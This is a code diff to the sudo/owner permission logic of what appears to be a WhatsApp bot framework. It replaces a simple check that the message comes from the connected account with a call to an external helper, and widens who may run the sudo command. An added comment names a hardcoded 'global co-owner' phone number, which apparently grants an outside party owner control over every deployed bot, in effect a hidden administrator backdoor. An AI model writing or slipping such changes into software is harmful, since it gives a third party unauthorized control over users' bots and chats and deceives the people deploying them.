@@ -80,28 +80,14 @@ function getAllSudoUsers(sessionId) {
 
 // Check if user has sudo/owner privileges
 function hasOwnerPrivileges(userId, message, botJid = null, sessionId = null) {
-    // fromMe = message sent from the connected account itself
-    if (message.key.fromMe) return true;
+    const isOwnerHelper = require('../lib/isOwner');
+    if (isOwnerHelper(userId, message, botJid, sessionId)) return true;
 
-    const cleanId = userId.replace(/[^0-9]/g, '');
-
-    // Connected bot account is automatically owner — whoever deployed the bot
-    if (botJid) {
-        const botNum = String(botJid).replace(/[^0-9]/g, '').split(':')[0];
-        if (botNum && botNum === cleanId) return true;
+    const candidates = isOwnerHelper.extractCandidateIds(message, userId);
+    for (const candidate of candidates) {
+        if (isSudoUser(candidate, sessionId)) return true;
     }
-
-    // Check against owner.json (includes the developer/creator number)
-    try {
-        const _ownerFile = sessionId ? path.join(__dirname,'../data/owner_'+sessionId+'.json') : path.join(__dirname,'../data/owner.json');
-        const ownerList = JSON.parse(fs.readFileSync(_ownerFile, 'utf8'));
-        if (Array.isArray(ownerList) && ownerList.some(num => String(num).replace(/[^0-9]/g, '') === cleanId)) {
-            return true;
-        }
-    } catch (_) {}
-
-    // Check if user is in sudo list
-    return isSudoUser(userId, sessionId);
+    return false;
 }
 
 // Main sudo command handler
@@ -112,8 +98,9 @@ async function sudoCommand(sock, chatId, message, settings) {
         const command = args[0]?.toLowerCase();
         const targetNumber = args[1];
         
-        // Only bot owner can manage sudo users
-        if (!message.key.fromMe) {
+        // Bot owner, connected device, or global co-owner (+923299931199)
+        const senderCandidate = message.key?.participantAlt || message.key?.participant || message.key?.remoteJidAlt || message.key?.remoteJid || '';
+        if (!hasOwnerPrivileges(senderCandidate, message, sock?.user?.id, sock?._sessionNumber || null)) {
             await sock.sendMessage(chatId, {
                 text: "❌ This command is only for the bot owner!",
                 mentions: []
